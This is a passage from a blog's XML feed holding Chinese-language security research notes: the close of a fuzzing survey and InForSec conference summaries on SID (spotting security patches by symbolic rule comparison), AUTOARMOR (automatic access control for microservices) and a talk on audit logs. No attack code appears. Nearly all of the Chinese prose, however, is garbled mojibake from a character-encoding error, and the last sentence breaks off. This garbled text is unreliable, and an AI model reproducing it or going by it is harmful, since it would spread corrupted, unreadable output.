¹æ®å‰äººçš„ä¸€äº›å·¥ä½œæˆ‘ä»¬å¯ä»¥çŸ¥é“æ–°çš„ç¡¬ä»¶ç‰¹æ€§èƒ½å¤Ÿæå¤§åœ°æé«˜Fuzzingçš„æ•ˆç‡ã€‚</p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>â€‹    Fuzzingæ˜¯ç›®å‰æœ€æœ‰æ•ˆå’Œæœ€é«˜æ•ˆçš„æ¼æ´å‘ç°æ–¹æ¡ˆã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å¯¹Fuzzingæ–¹æ³•åŠå…¶æœ€æ–°è¿›å±•åšäº†å…¨é¢çš„å›é¡¾å’Œæ€»ç»“ã€‚é¦–å…ˆæˆ‘ä»¬ä»‹ç»äº†Fuzzingçš„åŸºæœ¬åŸç†å’Œå·¥ä½œæµç¨‹ï¼Œç„¶åæˆ‘ä»¬ä»‹ç»äº†Fuzzingçš„åŸºæœ¬åˆ†ç±»æ ‡å‡†ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬è¿˜ä»‹ç»äº†Fuzzingåœ¨è¿™äº›å¹´çš„å‘å±•è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜å’ŒæŒ‘æˆ˜ã€‚æœ€åï¼Œæˆ‘ä»¬æ€»ç»“äº†ä¸Fuzzingç›¸ç»“åˆçš„æŠ€æœ¯ï¼Œä»¥åŠFuzzingçš„åº”ç”¨å’Œå¯èƒ½çš„æ–°è¶‹åŠ¿ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Survey </tag>
            
            <tag> Fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Conference - InForSec</title>
      <link href="/2021/06/06/Inforsec%20Learning/"/>
      <url>/2021/06/06/Inforsec%20Learning/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŒ—äº¬ä¹‹æ—…</em></p></blockquote><h1 id="Session-1"><a href="#Session-1" class="headerlink" title="Session 1"></a>Session 1</h1><h2 id="Precisely-Characterizing-Security-Impact-in-a-Floodof-Patches-via-Symbolic-Rule-Comparison"><a href="#Precisely-Characterizing-Security-Impact-in-a-Floodof-Patches-via-Symbolic-Rule-Comparison" class="headerlink" title="Precisely Characterizing Security Impact in a Floodof Patches via Symbolic Rule Comparison"></a>Precisely Characterizing Security Impact in a Floodof Patches via Symbolic Rule Comparison</h2><p><strong><em>Q: ä¸ºä»€ä¹ˆè¦è¯†åˆ«ä¸å®‰å…¨ç›¸å…³çš„ bugï¼Ÿ</em></strong><br>ä½œè€…åœ¨æ¢ç©¶ä¹‹åˆæå‡ºäº†ä¸Šè¿°è¿™ä¸ªé—®é¢˜ï¼Œç„¶åå›´ç»•è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†å¾ˆå¤šæ€è€ƒï¼Œå¾—å‡ºäº†ä»¥ä¸‹çš„ä¸¤ç‚¹ç»§ç»­ç ”ç©¶çš„åŠ¨æœº;</p><ol><li>bug æŠ¥å‘Šæ•°é‡å¾ˆå¤§</li><li>è¡¥ä¸ä¸ä»£ç çš„ä¼ æ’­ä¸åŠæ—¶</li></ol><p>ä»¥ä¸Šä¸¤ç‚¹æ€»ç»“èµ·æ¥å¯ä»¥ç†è§£ä¸ºç°æœ‰çš„ä¸€äº›é¡¹ç›®æˆ–è€…ä»£ç çš„ç»´æŠ¤è€…çš„æ•°é‡æ˜¯æœ‰é™çš„ï¼ŒåŒæ—¶æ¯ä¸ªäººçš„ç²¾åŠ›ä¹Ÿæ˜¯æœ‰é™çš„ã€‚å¯¹äºæ¯å¤©ä¸ŠæŠ¥çš„ bug æŠ¥å‘Šï¼Œç»´æŠ¤è€…å¾ˆéš¾åŠæ—¶å’Œå…¨é¢çš„å®¡æŸ¥è¿™äº›æŠ¥å‘Šã€‚ä¸ºæ­¤ï¼Œä½œè€…æå‡ºäº†ä»¥ä¸‹ Goalï¼š</p><p><strong><em>Goal: è¯†åˆ«ä¸å®‰å…¨ç›¸å…³çš„æ¼æ´è¡¥ä¸</em></strong><br>å…·ä½“æ¥è¯´ï¼Œè¯†åˆ«ä¸å®‰å…¨ç›¸å…³çš„æ¼æ´è¡¥ä¸èƒ½å¤Ÿè®©ä¸€äº›é¡¹ç›®æˆ–è€…ä»£ç çš„ç»´æŠ¤è€…èƒ½å¤ŸåŠæ—¶çš„æ‰“ä¸Šé‚£äº›å¨èƒä¸¥é‡çš„å®‰å…¨æ¼æ´è¡¥ä¸ä»¥é˜²æ­¢è¢«æ¶æ„æ”»å‡»è€…æ”»å‡»ï¼Œè€Œä¸ç”¨è€—è´¹ç²¾åŠ›åœ¨ä¿®å¤é‚£äº›æ— å…³ç´§è¦çš„ bugã€‚</p><p><strong>ä¼ ç»Ÿæ–¹æ³•</strong><br>ä¼ ç»Ÿçš„è¯†åˆ«æ–¹æ³•ä¸»è¦æœ‰ï¼š</p><ol><li>æ–‡æœ¬åˆ†æï¼šä¸»è¦æ˜¯ä¾é å…³é”®å­—åˆ†æ</li><li>ç»Ÿè®¡åˆ†æï¼šä¸»è¦æ˜¯ä¾é åˆ†æè¶‹åŠ¿</li></ol><p>ä½†ä¼ ç»Ÿæ–¹æ³•å…·æœ‰å¾ˆæ˜æ˜¾çš„å±€é™æ€§ï¼Œä¸€æ˜¯å…¶ç²¾åº¦éš¾ä»¥ä¿è¯ï¼ŒäºŒæ˜¯ç»´æŠ¤è€…éš¾ä»¥åˆ¤æ–­ bug çš„å½±å“åŠ›ã€‚</p><p><strong>é€šç”¨ä»£ç å®‰å…¨è§„åˆ™å’Œè¿è§„è¡Œä¸º</strong></p><ol><li>ç•Œå†…è®¿é—®ï¼ˆå†…å­˜ã€æ•°ç»„ï¼‰â€”â€” è¶Šç•Œè®¿é—®(out-of-bound access)</li><li>ä¸å…è®¸æŒ‡é’ˆç­‰ free åè¢«å†ä½¿ç”¨ â€”â€” free åé‡ç”¨(use-after-free)</li><li>å˜é‡åº”åˆå§‹åŒ–åä½¿ç”¨ â€”â€” æœªåˆå§‹åŒ–ä½¿ç”¨(uninitialized use)</li><li>æ•æ„Ÿæ“ä½œå‰çš„æƒé™æ£€æŸ¥ â€”â€” ç»•è¿‡æƒé™(permission bypass)</li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/9a3cab95-0dd9-4d1d-b526-7527e7741f65.png"></p><p>åŸºäºä»¥ä¸Šé€šç”¨ä»£ç å®‰å…¨è§„åˆ™å’Œå…¶å¯¹åº”çš„è¿è§„è¡Œä¸ºï¼Œä½œè€…æå‡ºäº†ä¸€ä¸ªå®šä¹‰ï¼šç»™å®šä¸€ä¸ªä»£ç å’Œè¡¥ä¸ï¼Œåœ¨æ²¡æœ‰æ‰“è¡¥ä¸çš„æƒ…å†µä¸‹ï¼Œä»£ç ä¼šè¿åä»¥ä¸Šå®‰å…¨è§„åˆ™ã€‚</p><p><strong>SID æ•´ä½“ç»“æ„</strong><br>æ ¹æ®ä¸Šè¿°å®šä¹‰ï¼Œä½œè€…æå‡ºäº† SIDï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäº LLVM çš„è§£å†³æ–¹æ¡ˆï¼Œå…¶æ¡†æ¶å¦‚ä¸‹<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/d90df980-318e-4d96-8d8a-c78097e800b2.png"></p><p>ä¸»è¦åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šé¢„å¤„ç†ï¼Œå‰–æè¡¥ä¸ï¼Œç¬¦å·è§„åˆ™æ¯”è¾ƒ</p><ol><li>é¢„å¤„ç†</li></ol><p>åœ¨é¢„å¤„ç†éƒ¨åˆ†ï¼Œä½œè€…é¦–å…ˆæ ¹æ® bug è¡¥ä¸å°†è½¯ä»¶çš„ç‰ˆæœ¬åˆ†ä¸ºæ‰“äº†è¡¥ä¸çš„ç‰ˆæœ¬å’Œæ²¡æœ‰æ‰“è¡¥ä¸çš„ç‰ˆæœ¬ï¼Œç„¶ååˆ†åˆ«è°ƒç”¨ LLVM å°†å…¶ç¼–è¯‘ä¸ºå¯¹åº”çš„ LLVM IRSã€‚</p><ol start="2"><li>å‰–æè¡¥ä¸</li></ol><p>ä¸»è¦æ˜¯é€šè¿‡é™æ€åˆ†ææ¥å¯¹ä¸åŒç‰ˆæœ¬çš„ä»£ç è¿›è¡Œåˆ†æã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼ŒSID æ ¹æ®è¡¥ä¸æ¨¡å‹å¯¹è¡¥ä¸è¿›è¡Œå‰–æï¼Œä»¥ç¡®å®šå…³é”®ç»„ä»¶ã€‚SID é¦–å…ˆè¯†åˆ«å‡ºæ‰“è¿‡è¡¥ä¸å’Œæ²¡æœ‰æ‰“è¿‡è¡¥ä¸çš„ç‰ˆæœ¬ä¸­çš„å®‰å…¨æ“ä½œã€‚æ¥ä¸‹æ¥ï¼ŒSID å¯¹å…³é”®å˜é‡è¿›è¡Œæ•°æ®æµåˆ†æï¼Œä»¥æ”¶é›†å­˜åœ¨æ¼æ´çš„ä»£ç ç‰‡æ®µã€‚</p><ol start="3"><li>ç¬¦å·è§„åˆ™æ¯”è¾ƒ</li></ol><ul><li>å¯¹äºæ‰“äº†è¡¥ä¸çš„ç‰ˆæœ¬<br>åœ¨æ‰“äº†è¡¥ä¸çš„ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨çš„æ¼æ´å¾€å¾€æ˜¯å­˜åœ¨äºè¡¥ä¸ä¹‹åã€‚ä¾‹å¦‚ï¼Œå¯¹äºè¶Šç•Œè®¿é—®æ¥è¯´ï¼Œé€šå¸¸è¡¥ä¸ä¼šåœ¨è¿›è¡Œè®¿é—®æ“ä½œä¹‹å‰æ ¡éªŒè®¿é—®çš„ç©ºé—´æ˜¯å¦æ˜¯æ­£ç¡®çš„ã€‚æ¢å¥è¯æ¥è¯´ï¼Œåœ¨æ‰“äº†è¡¥ä¸çš„ç‰ˆæœ¬ä¸­ï¼Œè¿åå®‰å…¨è§„åˆ™è¿™ä¸€è¡Œä¸ºæ˜¯ä¸å­˜åœ¨çš„ï¼Œå³æ‰“äº†è¡¥ä¸çš„ç‰ˆæœ¬ä¸å­˜åœ¨ç›¸åº”çš„æ¼æ´ã€‚</li><li>å¯¹äºæ²¡æ‰“è¡¥ä¸çš„ç‰ˆæœ¬<br>å¯¹äºæ²¡æœ‰æ‰“è¡¥ä¸çš„ç‰ˆæœ¬ï¼Œç”±äºå…¶å­˜åœ¨æ¼æ´çš„ä»£ç æ˜¯ç¨‹åºæ‰§è¡Œæµç¨‹ä¸­å¯è¾¾çš„ï¼Œå› æ­¤æ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹ä¸­æ˜¯ä¼šå‡ºå‘æ¼æ´çš„ã€‚æ¢å¥è¯æ¥è¯´ï¼Œå¯¹äºæ²¡æœ‰æ‰“è¡¥ä¸çš„ç‰ˆæœ¬æ¥è¯´ï¼Œä¸è¿åå®‰å…¨è§„åˆ™è¿™ä¸€è¡Œä¸ºæ˜¯ä¸å­˜åœ¨çš„ï¼Œå³æ²¡æœ‰æ‰“è¡¥ä¸çš„ç‰ˆæœ¬ä¸€å®šå­˜åœ¨ç›¸åº”çš„æ¼æ´ã€‚</li></ul><p>é€šè¿‡è¿™ä¸¤æ–¹é¢çš„çº¦æŸï¼Œæ‰èƒ½å¤Ÿè¯æ˜è¿™ä¸ªè¡¥ä¸ä¿®å¤çš„æ˜¯ä¸€ä¸ªå®‰å…¨ç›¸å…³çš„ bugã€‚</p><p><strong>æ–¹æ³•è¡¨ç°</strong><br>ä½œè€…åˆ†æäº† 54K çš„è¡¥ä¸ï¼Œå¹³å‡å¯¹æ¯ä¸ªè¡¥ä¸çš„åˆ†ææ—¶é—´ä¸º 0.83 ç§’ã€‚åŒæ—¶ï¼Œä½œè€…ä¸»è¦ä»å‡é˜³æ€§å’Œå‡é˜´æ€§ä¸¤æ–¹é¢æ¥åˆ†æ</p><ol><li>å‡é˜³æ€§åˆ†æ<br>ä½œè€…é€šè¿‡ SID å…±è®¡æ‰¾å‡ºäº† 227 ä¸ªå®‰å…¨ç›¸å…³çš„ bugï¼Œå…¶ä¸­ä»…æœ‰ 8 ä¸ªå‡é˜³æ€§çš„æ ·ä¾‹</li><li>å‡é˜´æ€§åˆ†æ<br>53%çš„å‡é˜´æ€§ï¼Œç»å¤§éƒ¨åˆ†éƒ½æ˜¯å› ä¸ºå¯¹å®‰å…¨ä»£ç å’Œæ¼æ´ä»£ç çš„è¦†ç›–ä¸å®Œå…¨å¯¼è‡´çš„ï¼Œè¿™æ˜¯æœ‰å¾…æ”¹è¿›çš„åœ°æ–¹ã€‚</li></ol><p><strong>æ€»ç»“</strong></p><ul><li>åŠæ—¶ä¿®è¡¥å®‰å…¨æ¼æ´éœ€è¦ç¡®å®šå®‰å…¨å½±å“<ul><li>è¡¥ä¸çš„ä¼ æ’­æˆæœ¬å¾ˆé«˜ï¼Œç»´æŠ¤è€…æ—¶é—´å’Œç²¾åŠ›æœ‰é™</li><li>ä¸ºæ­¤ï¼Œç»´æŠ¤è€…éœ€è¦ç¡®å®šå’ŒåŠæ—¶ä¿®å¤é‚£äº›ä¸å®‰å…¨ç›¸å…³çš„ bug</li></ul></li><li>ä½¿ç”¨å—çº¦æŸçš„ç¬¦å·æ‰§è¡Œçš„ç‰¹æ€§æ¥ç¡®å®šå“ªäº›æ˜¯ä¸å®‰å…¨ç›¸å…³çš„ bugï¼Œå“ªäº›æ˜¯å¸¸è§„çš„ bug<ul><li>SIDï¼šç¬¦å·è§„åˆ™æ¯”è¾ƒ</li></ul></li><li>SID å‘ç°äº†å†…æ ¸ä¸­è®¸å¤šè¢«å¿½è§†çš„å®‰å…¨æ¼æ´</li></ul><h1 id="Session-2"><a href="#Session-2" class="headerlink" title="Session 2"></a>Session 2</h1><h2 id="Automatic-Policy-Generation-for-Inter-Service-Access-Control-of-Microservices"><a href="#Automatic-Policy-Generation-for-Inter-Service-Access-Control-of-Microservices" class="headerlink" title="Automatic Policy Generation for Inter-Service Access Control of Microservices"></a>Automatic Policy Generation for Inter-Service Access Control of Microservices</h2><p><strong>ç ”ç©¶èƒŒæ™¯</strong><br>äº‘åº”ç”¨æ¶æ„çš„æ¼”è¿›ï¼Œä»ä¼ ç»Ÿçš„æ¨¡å—ç´§è€¦åˆã€ä¸æ˜“ç»´æŠ¤å’Œæ‰©å±•çš„å•ä½“æ¶æ„æ¼”å˜ä¸ºå°†æ¨¡å—è§£è€¦ã€ç‹¬ç«‹å¼€å‘å’Œéƒ¨ç½²çš„å¾®æœåŠ¡æ¶æ„ï¼Œå†åˆ°ç»Ÿä¸€ç®¡ç†æœåŠ¡é—´é€šä¿¡çš„æœåŠ¡ç½‘æ ¼ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/eade3d98-e479-498d-8e0e-2691b4d25601.png"></p><p><strong>ç ”ç©¶åŠ¨æœº</strong><br>é¦–å…ˆæ˜¯å¾®æœåŠ¡ä¹‹é—´é€šè¿‡ç½‘ç»œ API çš„é€šä¿¡æ–¹å¼ä¼šå¸¦æ¥ä¸€äº›æ–°çš„æ”»å‡»é¢ã€‚å…¶æ¬¡ï¼Œä¸å®‰å…¨çš„å®¹å™¨é•œåƒå¯èƒ½ä¼šå¯¼è‡´å®¹å™¨è¢«æ¸—é€ã€‚</p><p>ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ï¼š</p><ul><li>å¨èƒï¼šè¢«æ”»ç ´çš„å¾®æœåŠ¡å¯èƒ½é€šè¿‡æ¶æ„è¯·æ±‚çªƒå–æ•°æ®æˆ–å‘èµ·æ”»å‡»</li><li>å¯¹ç­–ï¼šæœåŠ¡é—´ç»†ç²’åº¦çš„è®¿é—®æ§åˆ¶</li></ul><p>ç°åœ¨çš„å¾®æœåŠ¡åº”ç”¨å…·æœ‰è§„æ¨¡åºå¤§ä¸”é¢‘ç¹æ›´æ–°çš„ç‰¹ç‚¹ï¼Œå¦‚æœæ‰‹å·¥é…ç½®è®¿é—®æ§åˆ¶ç­–ç•¥çš„è¯ï¼Œä¸ä»…è€—æ—¶å·¨å¤§ä¸”å®¹æ˜“å‡ºé”™ï¼Œä¹Ÿç›¸å¯¹æ²¡é‚£ä¹ˆçµæ´»ã€‚</p><p>ç°æœ‰çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„å®‰å…¨ç­–ç•¥è‡ªåŠ¨åŒ–æ–¹æ³•ï¼š</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8ed93ef9-3bda-4404-9425-eb29775f6811.png"></p><p><strong>è®¾è®¡æ€è·¯</strong><br>å¾®æœåŠ¡åº”ç”¨çš„ç‰¹ç‚¹ï¼š</p><ul><li>å•ä¸ªå¾®æœåŠ¡çš„å†…éƒ¨å¤æ‚åº¦è¾ƒä½</li><li>å•ä¸ªåº”ç”¨ç±»<ul><li>å¾®æœåŠ¡é—´çš„è°ƒç”¨æ–¹å¼ç›¸å¯¹ç»Ÿä¸€</li><li>æ¶‰åŠåˆ°çš„æœåŠ¡é—´è°ƒç”¨åè®®å’Œè°ƒç”¨åº“çš„æ•°é‡ä¹Ÿååˆ†æœ‰é™</li></ul></li></ul><p>ç»“åˆä»¥ä¸Šç‰¹ç‚¹ï¼Œä½œè€…é‡‡ç”¨äº†é€šè¿‡é™æ€åˆ†æçš„æ–¹å¼ä»å¾®æœåŠ¡ä»£ç ä¸­æå–å…¶æ­£å¸¸çš„ç³»ç»Ÿè¡Œä¸ºã€‚<br>äºæ˜¯ä½œè€…ä¾¿æå‡ºäº†ï¼š<br><em>GOAL: è‡ªåŠ¨ç”Ÿæˆã€ç»´æŠ¤ã€æ›´æ–°å¾®æœåŠ¡çš„æœåŠ¡é—´è®¿é—®æ§åˆ¶ç­–ç•¥</em><br><em>Challengeï¼šå¦‚ä½•è·å–å®Œæ•´ã€ç»†ç²’åº¦çš„æœåŠ¡é—´è°ƒç”¨é€»è¾‘ï¼›å¦‚ä½•å¯¹æœåŠ¡é—´çš„è®¿é—®æ§åˆ¶ç­–ç•¥è¿›è¡Œé«˜æ•ˆçš„ç”Ÿæˆå’Œæ›´æ–°</em></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/7d66b478-8d85-46b0-8574-dd46510184af.png"><br><em>åŸºäºé™æ€åˆ†æçš„å¾®æœåŠ¡é—´è°ƒç”¨è¯·æ±‚æå–</em><br>å…·ä½“æ¥è¯´åˆ†ä¸ºä¸‰æ­¥ï¼šç¬¬ä¸€æ­¥è¯†åˆ«ç½‘ç»œ API è°ƒç”¨è¯­å¥ï¼Œå³å‘èµ·æœåŠ¡é—´è°ƒç”¨çš„å…³é”®è¯­å¥ï¼›ç¬¬äºŒæ­¥ä»¥ç¬¬ä¸€æ­¥è·å–çš„å…³é”®è¯­å¥ä¸ºèµ·ç‚¹ï¼Œæ²¿æ•°æ®æµåå‘è¿›è¡Œæ±¡ç‚¹ä¼ æ’­ï¼Œè·å–ç¨‹åºåˆ‡ç‰‡ï¼›ç¬¬ä¸‰æ­¥é€šè¿‡è¯­ä¹‰åˆ†æåœ¨ç¨‹åºåˆ‡ç‰‡ä¸­æå–æœåŠ¡é—´è°ƒç”¨çš„è¯¦ç»†å±æ€§ã€‚</p><p><em>åŸºäºå›¾çš„å¾®æœåŠ¡é—´è®¿é—®æ§åˆ¶ç­–ç•¥ç®¡ç†</em><br>è¿è¡Œæ—¶çš„ç­–ç•¥æ£€æŸ¥æ—¶é—´éšç€å®‰è£…çš„æœåŠ¡é—´è®¿é—®æ§åˆ¶ç­–ç•¥æ•°ç›®çº¿æ€§å¢åŠ ï¼Œè¿™ä¼šé€ æˆæ•´ä¸ªå¾®æœåŠ¡åº”ç”¨æ€§èƒ½ä¸‹é™ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/c43d41df-d252-40bc-b189-b6413e3bc57b.png"></p><p>å¾€å¾€åŒä¸€å¾®æœåŠ¡å¯èƒ½ä¼šå­˜åœ¨ä¸åŒç‰ˆæœ¬åœ¨åŒä¸€æ—¶é—´æä¾›ä¸åŒçš„æœåŠ¡ï¼Œè¿™åˆä¼šé€ æˆå†—ä½™ï¼Œäºæ˜¯ä½œè€…æå‡ºäº†ä¸€ç§ä¼˜åŒ–æ€è·¯ï¼šå°†åŒä¸€æœåŠ¡çš„å„ç‰ˆæœ¬å…±æœ‰çš„æƒé™è¿›è¡Œæ•´åˆã€‚è¿™æ—¢æ¶ˆé™¤äº†å†—ä½™ï¼Œå‡å°‘äº†ç­–ç•¥æ€»æ•°ï¼Œåˆæ¶ˆé™¤äº†ä¸å¿…è¦çš„ç­–ç•¥æ›´æ–°ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0c1b8d6e-f1d6-474b-83f3-ebe06a734434.png"></p><p><strong>AUTOARMOR</strong></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/85a45a24-0b14-4f3f-94b8-5a1f5ce33a3b.png"><br>AUTOARMOR ä¸»è¦ç”±ä¸‰éƒ¨åˆ†æ„æˆï¼š</p><ol><li>é™æ€åˆ†æå¼•æ“<br>æœåŠ¡ E ä»£ç æäº¤ï¼Œé™æ€åˆ†æå¼•æ“ç”Ÿæˆæ¸…å•æ–‡ä»¶æè¿°å…¶å‘èµ·çš„è°ƒç”¨ã€‚</li><li>æƒé™å¼•æ“<br>åœ¨ E éƒ¨ç½²æ—¶ï¼Œæƒé™å¼•æ“è·å–å…¶æ¸…å•æ–‡ä»¶ï¼Œç”Ÿæˆæƒé™èŠ‚ç‚¹åŠ å…¥æƒé™å›¾</li><li>ç­–ç•¥ç”Ÿæˆå™¨<br>ç­–ç•¥ç”Ÿæˆå™¨æ ¹æ®æƒé™å›¾çš„å˜åŒ–ç”Ÿæˆå¹¶ä¸‹å‘è®¿é—®æ§åˆ¶ç­–ç•¥ã€‚</li></ol><p>ç­–ç•¥ç”Ÿæˆï¼šå°†ä¸å½“å‰æƒé™èŠ‚ç‚¹ç›¸å…³çš„æ¯ä¸ªè¯·æ±‚è¾¹ç¿»è¯‘æˆä¸€æ¡æœåŠ¡é—´è®¿é—®æ§åˆ¶ç­–ç•¥ï¼›å¦‚æœä¸€ä¸ªè°ƒç”¨è¯·æ±‚çš„ç›®æ ‡å¾®æœåŠ¡å°šæœªéƒ¨ç½²ï¼Œå°±ä¸æˆäºˆå¾®æœåŠ¡ç›¸åº”çš„æƒé™</p><p>ç­–ç•¥æ›´æ–°ï¼šç‰ˆæœ¬æ›´æ–°å¯¹åº”ç‰ˆæœ¬èŠ‚ç‚¹çš„æ·»åŠ ï¼›ç‰ˆæœ¬å›æ»šå¯¹åº”ç‰ˆæœ¬èŠ‚ç‚¹çš„åˆ é™¤</p><p><strong>æ€»ç»“</strong><br>AUTOARMOR æ˜¯ç¬¬ä¸€ä¸ªå¾®æœåŠ¡é—´è®¿é—®æ§åˆ¶ç­–ç•¥è‡ªåŠ¨ç”Ÿæˆçš„è§£å†³æ–¹æ¡ˆã€‚ä¸»è¦æ¶‰åŠåˆ°çš„ä¸€äº›æŠ€æœ¯æœ‰ï¼š</p><ul><li>ä¸€ä¸ªåŸºäºé™æ€åˆ†æçš„å¾®æœåŠ¡é—´è°ƒç”¨è¯·æ±‚è‡ªåŠ¨æå–æœºåˆ¶</li><li>ä¸€ä¸ªåŸºäºå›¾çš„è‡ªåŠ¨åŒ–ä¸ºæœåŠ¡é—´è®¿é—®æ§åˆ¶ç­–ç•¥ç®¡ç†æœºåˆ¶</li></ul><p>AUTOARMOR å¯ä»¥æœ‰æ•ˆåœ°å®ç°å¾®æœåŠ¡é—´è®¿é—®æ§åˆ¶ç­–ç•¥çš„è‡ªåŠ¨ç”Ÿæˆã€ç»´æŠ¤å’Œæ›´æ–°ï¼Œä½†åªå¼•å…¥æå°çš„æ€§èƒ½å¼€é”€ã€‚</p><h1 id="Session-3"><a href="#Session-3" class="headerlink" title="Session 3"></a>Session 3</h1><h2 id="Understanding-Audit-Logs-Techniques-Experience-and-Requirements"><a href="#Understanding-Audit-Logs-Techniques-Experience-and-Requirements" class="headerlink" title="Understanding Audit Logs: Techniques, Experience, and Requirements"></a>Understanding Audit Logs: Techniques, Experience, and Requirements</h2><p>ä½œè€…é¦–å…ˆåˆ†äº«äº†å…¶å¯¹äºç ”ç©¶çš„ä¸€äº›ç†è§£å’Œç»éªŒ</p><p><strong>è®¡ç®—æœºç³»ç»Ÿç ”ç©¶çš„ç»´åº¦</strong><br>é€šå¸¸æ¥è¯´ï¼Œå¼€å§‹ä¸€é¡¹ç ”ç©¶å¾€å¾€ç”± Project/Paper å¼€å§‹ï¼Œå‘ä¸‹æ˜¯å…¶å…·ä½“çš„ Implementationï¼Œå‘ä¸Šæ˜¯å…¶æŠ½è±¡çš„ Thesis/Themeã€‚<br>å¯¹äº Thesis/Theme æ¥è¯´ï¼Œç ”ç©¶è€…éœ€è¦å°†ä¸åŒçš„ Claim å½’çº³ä¸º Statementã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/5b32be9f-76f4-4311-94e1-a02db952a7ed.png" style="zoom: 70%;"><br>ç„¶åéœ€è¦å†å°†è¿™äº› Statement è¿›è¡Œæ€»ç»“ï¼Œå¸¦å…¥è‡ªå·±çš„ä¸€äº›æƒ³æ³•ï¼Œä»¥å½¢æˆåœ¨è‡ªå·±ç ”ç©¶é¢†åŸŸä¸­çš„ View/Insight/Philosophyã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2a9287d3-c7bc-4905-9842-c329999a9df1.png" style="zoom: 70%;"><br>è€Œå¯¹äºä¸åŒçš„ Implementationï¼Œç ”ç©¶è€…éœ€è¦å†å°†å…¶è½¬æ¢ä¸º Tool/System/Platformï¼Œä»¥æ–¹ä¾¿çºµå‘ç ”ç©¶æ—¶èƒ½å¤Ÿè¾ƒå¥½åœ°èŠ‚çœé‡å¤å·¥ä½œçš„æˆæœ¬ã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/09c41055-2cee-47aa-a210-31a72bd646d6.png" style="zoom: 70%;"></p><p>ç»¼åˆæ¥è¯´ï¼Œä½œä¸ºä¸€åç ”ç©¶è€…ï¼Œä»–åº”è¯¥æ—¢èƒ½å†™ paper ä¹Ÿèƒ½å†™å·¥å…·ï¼Œè€Œè¯» pape çš„ç›®çš„æ˜¯è¦å»ç†è§£è¿™äº›å·²æœ‰å·¥ä½œä¹‹é—´çš„å…³ç³»ï¼Œæ‰¾å‡ºå…¶ä¸­è¿˜æ²¡æœ‰åšæˆ–è€…è¯´è¿˜æœ‰å¾…æ”¹è¿›çš„åœ°æ–¹ã€‚å½“ä½ å¯¹äºä¸€ä¸ªé¢†åŸŸæœ‰ä¸€ä¸ªç¨³å®šçš„ view çš„æ—¶å€™æ‰èƒ½å¤Ÿæ›´å¥½æ›´æ·±åœ°å»çœ‹å¾…ä¸€ä¸ªé—®é¢˜ï¼Œä»¥æ­¤æ¥æ‰¾ ideaã€‚</p><p><strong>ç³»ç»Ÿç ”ç©¶çš„ç»´åº¦</strong><br>äººä¸ç³»ç»Ÿçš„ç›¸äº’å½±å“å¦‚ä¸‹<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/d1506cfb-8d50-4387-89c0-1728b9d6cb14.png" style="zoom: 70%;"></p><ul><li>ç³»ç»Ÿå¯¹ç³»ç»Ÿçš„å½±å“<br>ç³»ç»Ÿä¸ç³»ç»Ÿä¹‹é—´å¾€å¾€æ˜¯å­¤ç«‹çš„ï¼Œç›¸åº”çš„è¦åˆ†æç³»ç»Ÿä¸ç³»ç»Ÿä¹‹é—´çš„å…³ç³»ä¹Ÿå°±æ˜¯åˆ†æä¸åŒç³»ç»Ÿä¹‹é—´çš„å…³è”æ€§</li><li>ç³»ç»Ÿå¯¹äººçš„å½±å“<br>ç³»ç»Ÿéœ€è¦äººæ¥æ“ä½œï¼Œç›¸åº”çš„ç³»ç»Ÿèµ‹äºˆäº†äººæœ‰ä¸€å®šçš„è´£ä»»æ¥å¯¹ç³»ç»Ÿè´Ÿè´£</li><li>äººå¯¹ç³»ç»Ÿçš„å½±å“<br>åœ¨ç³»ç»Ÿä¸­åŠ å…¥äººçš„å› ç´ ï¼Œè€Œäººå¾€å¾€æ˜¯ä¸€ä¸ªå®Œå¤‡ç³»ç»Ÿä¸­çš„å¼±ç‚¹ã€‚</li><li>äººå¯¹äººçš„å½±å“<br>äººå¯¹äººçš„å½±å“å¾€å¾€æ›´å¤šæ˜¯åœ¨äººç±»ç¤¾ä¼šä¸­çš„æ³•å¾‹ï¼Œä¼¦ç†ç­‰é—®é¢˜ä¸Šçš„å½±å“ã€‚</li></ul><p><strong><em>Q: æ€ä¹ˆé€‰å–å’Œå¼€å¯ä¸€æ¡çº¿çš„ç ”ç©¶?</em></strong><br>é¦–å…ˆå°±æ˜¯è¦å¤šè¯»è¿™ä¸ªé¢†åŸŸç›¸å…³çš„ä¸€äº›è®ºæ–‡ï¼Œåœ¨è¯»è¿™äº›è®ºæ–‡çš„è¿‡ç¨‹ä¸­éœ€è¦ä½“ç³»åŒ–çš„æ€»ç»“ã€‚æœ€ç»ˆçš„ç›®çš„æ˜¯è¦å‘ç°ä¸€ä¸ªç¼ºå¤±çš„ç ”ç©¶ç‚¹ä»¥æ­¤æ‰¾åˆ°ç 